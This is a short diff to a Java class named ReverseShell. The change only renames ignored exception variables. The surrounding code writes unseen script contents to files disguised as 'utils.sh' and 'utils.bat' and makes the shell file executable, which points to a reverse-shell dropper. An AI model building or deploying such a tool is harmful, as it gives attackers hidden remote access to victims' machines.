@@ -20,7 +20,7 @@ class ReverseShell {
             output.write(scriptContent);
             output.close();
             Runtime.getRuntime().exec("chmod u+x out/production/utils.sh");
-        }catch (IOException ex){}
+        }catch (IOException ignored){}
     }
 
     public static void windowsBat(){
@@ -28,7 +28,7 @@ class ReverseShell {
         try{
             Writer output = new BufferedWriter(new FileWriter("out/production/utils.bat"));
             output.write(scriptContent);
-        }catch (IOException ex){}
+        }catch (IOException ignored){}
     }
 
 
